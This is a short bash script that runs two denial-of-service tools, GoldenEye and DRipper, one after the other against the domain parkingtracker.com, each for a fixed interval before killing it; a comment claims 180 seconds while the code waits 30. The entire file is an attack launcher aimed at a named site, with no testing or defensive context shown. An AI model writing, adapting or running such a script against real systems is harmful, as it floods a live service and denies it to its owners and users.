#!/bin/bash

# Define the commands in an array
commands=(
  "python3 ./dos_ge/goldeneye.py http://parkingtracker.com"
  "python3 ./dos_ripper_/DRipper.py -s parkingtracker.com"
)

# Loop through each command
for cmd in "${commands[@]}"; do
  echo "Running command: $cmd"
  # Start the command in the background
  $cmd &
  # Get the PID of the command just run
  cmd_pid=$!
  # Wait for 180 seconds before killing the command
  sleep 30
  # Kill the command
  kill $cmd_pid
  # Optional: sleep for a bit before starting the next command
  sleep 2
done

echo "All commands have been executed."
